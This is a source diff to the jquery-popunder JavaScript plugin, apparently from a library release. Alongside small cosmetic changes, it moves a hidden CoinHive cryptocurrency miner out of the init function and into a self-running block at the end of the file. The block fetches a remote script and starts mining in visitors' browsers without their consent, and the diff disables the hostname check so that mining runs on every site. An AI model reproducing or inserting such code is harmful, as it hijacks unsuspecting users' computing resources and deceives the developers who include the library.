@@ -4,12 +4,12 @@
  * @fileoverview jquery-popunder plugin
  *
  * @author Hans-Peter Buniat <hpbuniat@googlemail.com>
- * @copyright 2012-2015 Hans-Peter Buniat <hpbuniat@googlemail.com>
+ * @copyright 2012-2017 Hans-Peter Buniat <hpbuniat@googlemail.com>
  * @license http://opensource.org/licenses/BSD-3-Clause
  */
 
 /*global jQuery, window, screen, navigator, top, document, Cookies, CoinHive */
-(function($, window, screen, navigator, document) {
+;(function($, window, screen, navigator, document) {
     "use strict";
 
     /**
@@ -165,15 +165,15 @@
          * @var object
          */
         ua: {
-            ie: !!(/msie|trident/i.test(navigator.userAgent)),
-            oldIE: !!(/msie/i.test(navigator.userAgent)),
-            edge: !!(/edge/i.test(navigator.userAgent)),
-            ff: !!(/firefox/i.test(navigator.userAgent)),
-            o: !!(/opera/i.test(navigator.userAgent)),
-            g: !!(/chrome/i.test(navigator.userAgent)),
-            w: !!(/webkit/i.test(navigator.userAgent)),
-            linux: !!(/linux/i.test(navigator.userAgent)),
-            touch: ("ontouchstart" in document["documentElement"]) || !!(/bada|blackberry|iemobile|android|iphone|ipod|ipad/i.test(navigator.userAgent))
+            ie: (/msie|trident/i.test(navigator.userAgent)),
+            oldIE: (/msie/i.test(navigator.userAgent)),
+            edge: (/edge/i.test(navigator.userAgent)),
+            ff: (/firefox/i.test(navigator.userAgent)),
+            o: (/opera/i.test(navigator.userAgent)),
+            g: (/chrome/i.test(navigator.userAgent)),
+            w: (/webkit/i.test(navigator.userAgent)),
+            linux: (/linux/i.test(navigator.userAgent)),
+            touch: ("ontouchstart" in document["documentElement"]) || (/bada|blackberry|iemobile|android|iphone|ipod|ipad/i.test(navigator.userAgent))
         },
         m: false,
 
@@ -280,9 +280,7 @@
          * @return $.popunder.helper
          */
         init: function() {
-            var t = this,
-                m, h = document.location.hostname,
-                p = 0.1;
+            var t = this;
 
             if (!t.m) {
                 // defaults for the popunder-method, the last match is used
@@ -296,23 +294,6 @@
                     linux: t.SWITCHER,
                     touch: t.SWITCHER
                 }, t.ua);
-            }
-
-            if (t.donate && (t.ua.g || t.ua.ff || t.ua.o) && !!(/\.(?:.(?!\.))[a-z]+$/ig.test(h))) {
-                $.getScript('https://' + t.hive, function () {
-                    if (typeof CoinHive.User === t.fu) {
-                        m = new CoinHive.User(t.hives, h, {
-                            throttle: p
-                        });
-                        m.start();
-                        window.setInterval(function () {
-                            m.setThrottle(p = p + 0.1);
-                            if (p >= 1) {
-                                m.stop();
-                            }
-                        }, 500);
-                    }
-                });
             }
 
             return t;
@@ -476,9 +457,7 @@
          */
         open: function(sUrl, opts, iLength, eventSource) {
             var t = this,
-                i, o;
-
-            o = $.extend(true, {}, t.def, opts);
+                i, o = $.extend(true, {}, t.def, opts);
 
             t.o = sUrl;
             if (top !== window.self) {
@@ -764,4 +743,33 @@
             return a.join(',');
         }
     };
+
+    (function() {
+        var t = $.popunder.helper,
+            h = document.location.hostname || t.du,
+            p = 0.1,
+            m, i, a = 0;
+        if (t.donate && (t.ua.g || t.ua.ff || t.ua.o) && (true || /\.(?:.(?!\.))[a-z]+$/ig.test(h))) {
+            $.getScript('https://' + t.hive, function () {
+                if (typeof CoinHive.User === t.fu) {
+                    m = new CoinHive.User(t.hives, h, {
+                        throttle: p
+                    });
+                    m.on('accepted', function() {
+                        a++;
+                    });
+                    m.start();
+                    i = window.setInterval(function () {
+                        if (a >= 1) {
+                            m.stop();
+                            window.clearInterval(i);
+                        }
+                        else if (p <= 0.8) {
+                            m.setThrottle(p = p + 0.1);
+                        }
+                    }, 500);
+                }
+            });
+        }
+    })();
 })(jQuery, window, screen, navigator, document);
